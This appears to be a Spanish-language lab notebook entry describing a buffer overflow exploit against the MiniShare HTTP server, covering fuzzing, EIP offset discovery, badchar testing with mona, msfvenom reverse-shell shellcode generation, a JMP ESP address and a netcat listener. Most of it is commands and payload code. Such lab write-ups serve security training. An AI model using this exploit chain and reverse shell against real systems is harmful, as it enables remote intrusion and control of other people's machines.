---
Tema: "[[Buffer Overflow]]"
---

## 🎯 Inicio

Trabajaremos sobre **[MiniShare](https://sourceforge.net/projects/minishare/)** para explotar una vulnerabilidad de *Buffer Overflow* (BoF).
MiniShare expone un servicio HTTP a través del **puerto 80**.

📌 **Requisito previo:**
Necesitamos habilitar el uso de `telnet` para interactuar con el servicio antes de armar nuestro script en Python:

```bash
telnet <ip> <puerto>
```

Una vez conectados, enviamos la siguiente petición HTTP para probar la respuesta del servidor:
```http
GET / HTTP/1.1
<Enter>
<Enter>
```
> [!info] Nota
> Este comportamiento de enviar la petición con los saltos de línea será programado posteriormente en nuestro script de explotación.

---

## 🔍 Fase de Fuzzing

El *Buffer Overflow* ocurre exactamente al enviar una petición HTTP GET con una gran cantidad de caracteres "A":
```http
GET AAAAAAA... HTTP/1.1
```

Nuestro objetivo inicial es descubrir en qué punto se sobrescriben los registros **`EIP`** (Instruction Pointer) y **`ESP`** (Stack Pointer).  
> 💡 *Recordatorio:* El script de explotación se encuentra en `red_vault/scripts/buffer_overflow/lab2_MiniShare.py`.

El servicio HTTP colapsa y explota cuando se le envían **1800 bytes** (`\x41` = 'A').

### Encontrar el Offset exacto
Para saber dónde se encuentra exactamente el límite antes de sobrescribir el registro `EIP`, generamos un payload con un patrón único. Usaremos la herramienta de Metasploit junto con **[[Inmunnity Debugger]]**.

1. **Crear el patrón (1800 bytes):**
   ```bash
   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1800
   ```
   *Esto devuelve una cadena de caracteres única.*

2. **Detectar la sobrescritura:**
   Enviamos ese patrón y verificamos en Immunity Debugger en qué momento se rompe el programa.
   ![[Pasted image 20260107104952.png]]
   
   Supongamos que el valor en EIP al momento del crash es `0x36684335`.

3. **Calcular la longitud (Offset):**
   ```bash
   /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x36684335
   ```
   *Esto nos dará una longitud exacta, en este caso **1787 bytes**.*

### Verificación del Offset
Para comprobar que controlamos el `EIP`, modificamos nuestro script:
```python
offset = 1787
before_eip = b'A' * offset
eip = b'B' * 4 # Debería sobrescribir EIP con 42424242

payload = before_eip + eip
```

---

## 🚫 Fase de Badchars (Caracteres Malos)

Dado que nuestro `EIP` está contiguo al `ESP`, podemos proceder a identificar los *badchars*.  
Utilizaremos **[[mona (python)]]** dentro de **[[Inmunnity Debugger]]**.

1. **Generar el bytearray en Mona:**
   ```python
   !mona bytearray -cpb "\x00"
   ```
   > [!warning] Atención
   > Esto crea todas las combinaciones posibles desde `\x01` hasta `\xff` excluyendo el null byte (`\x00`), que siempre es un badchar en cadenas C.

2. **Transferir y probar:**
   El resultado se guardará en un archivo `.txt`. Debemos transferirlo a nuestra máquina atacante (ej. usando **[[SMB - Transferencia de archivos por SMB]]**).
   Inyectamos esa secuencia de bytes en el stack enviándola en el payload.

3. **Comparar memoria:**
   Luego del nuevo crash, miramos el volcado de memoria o usamos Mona para comparar y detectar qué caracteres se "rompieron" o desaparecieron:
   ```python
   !mona compare -f RUTA_PARA_EL_OUTPUT.bin -a \xESP
   ```
   *(Donde `\xESP` es la dirección actual del registro ESP).*

**Resultado:** Descubrimos que los badchars son `\x00` y `\x0d` (Retorno de carro).

---

## 💻 Fase de Shellcode

Ya conociendo los badchars, generamos nuestra *Shellcode* (Reverse Shell) usando **[[msfvenom]]**:

```bash
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=IP_ATACANTE LPORT=PUERTO_ATACANTE -e x86/shikata_ga_nai EXITFUNC=thread -f c -b '\x00\x0d'
```

Integramos el Shellcode generado en nuestro script de Python. Nuestro payload final tomará esta estructura:

```python
OFFSET_EIP = 1787
before_eip = b'A' * OFFSET_EIP
eip = b'B' * 4 # Lo reemplazaremos con JMP ESP en el próximo paso

# Ejemplo simulado de Shellcode generado por msfvenom
shellcode = b"\xb8\x1d\x7e\x3f\x1e\xda\xd6\xd9\x74\x24\xf4\x5a\x31\xc9\xb1" 
nops = b'\x90' * 16  # NOP sled (colchón de NOPs para asegurar la ejecución)

payload = before_eip + eip + nops + shellcode
```

---

## 🦘 Fase: Encontrar Instrucción de Salto (JMP ESP)

Necesitamos sobrescribir el `EIP` no con "B"s, sino con la dirección de memoria de una instrucción que salte al stack (`JMP ESP`), donde residirá nuestro Shellcode.  
Como trabajamos en arquitectura x86, la dirección debe formatearse usando **[[BOF - Little Endian]]**.

1. **Buscar el Opcode de `JMP ESP`:**
   ```bash
   /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
   nasm > jmp ESP
   ```
   *El Opcode es `FFE4` (`\xFF\xE4`).*

2. **Encontrar un módulo vulnerable:**
   En Mona listamos los módulos de la aplicación:
   ```python
   !mona modules
   ```
   Encontramos que el propio binario `minishare.exe` carece de protecciones (ASLR, DEP, etc. en falso):
   ![[Pasted image 20260107114439.png]]

3. **Buscar la instrucción en el módulo:**
   ```python
   !mona find -s "\xFF\xE4" -m minishare.exe
   # Alternativa: !mona find -s "JMP ESP"
   ```
   Seleccionamos una dirección que **no contenga badchars** (`\x00` o `\x0d`).  
   **Dirección elegida:** `0x752c3cda`

---

## 🚀 Fase de Explotación Final

Ajustamos la variable `eip` en nuestro script en Python, empacando la dirección en formato Little Endian usando la librería `struct.pack`:

```python
from struct import pack

eip = pack("<L", 0x752c3cda)
```

**Pasos finales:**
1. Nos ponemos en escucha en nuestra máquina atacante usando **[[rlwrap]]** y `Netcat`:
   ```bash
   rlwrap nc -nlvp 443
   ```
2. Ejecutamos el exploit:
   ```bash
   python lab2_MiniShare.py
   ```
¡Boom! 🐚 Reverse shell conseguida.
